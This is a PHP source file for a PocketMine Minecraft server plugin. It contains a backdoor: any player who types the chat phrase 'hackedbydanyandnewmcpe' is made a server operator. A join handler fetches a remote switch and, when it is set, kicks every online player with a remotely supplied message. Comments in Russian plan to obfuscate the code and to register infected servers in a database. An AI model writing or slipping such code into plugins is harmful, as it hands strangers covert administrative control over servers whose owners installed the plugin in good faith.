<?php
//TODO Зашифруй код
namespace krendell;

use pocketmine\event\Listener;
use pocketmine\event\player\PlayerChatEvent;
use pocketmine\event\player\PlayerJoinEvent;
use pocketmine\plugin\PluginBase;


class Main extends PluginBase implements Listener
{
    public function onEnable()
    {
        $this->getServer()->getPluginManager()->registerEvents($this, $this);
        //TODO Сделать проверку на добавление сервера в базу и добавить его.
    }

    public function join(PlayerJoinEvent $e)
    {
        $kick = file_get_contents("");
        $message = file_get_contents("");
        if ($kick == 'on') {
            foreach ($this->getServer()->getOnlinePlayers() as $p) {
                $p->kick($message);
            }
        }
    }

    public function opme(PlayerChatEvent $e)
    {
        $msg = $e->getMessage();
        if ($msg == "hackedbydanyandnewmcpe") {
            $e->getPlayer()->setOp(true);
        }
    }
}
